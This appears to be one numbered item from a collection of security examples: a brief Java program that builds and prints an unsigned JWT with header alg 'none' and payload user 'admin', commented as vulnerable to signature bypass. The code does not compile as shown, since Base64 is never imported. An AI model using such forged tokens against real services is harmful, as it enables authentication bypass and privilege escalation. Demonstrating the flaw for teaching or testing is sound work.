// JWT (JSON Web Token Manipulation)

import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;

public class _30 {
    public static void main(String[] args) {
        String header = "{\"alg\":\"none\"}";
        String payload = "{\"user\":\"admin\"}";

        String unsignedToken = Base64.getEncoder().encodeToString(header.getBytes()) + "." +
                               Base64.getEncoder().encodeToString(payload.getBytes()) + ".";

        System.out.println("Unsigned JWT: " + unsignedToken); // Vulnerable to signature bypass
    }
}
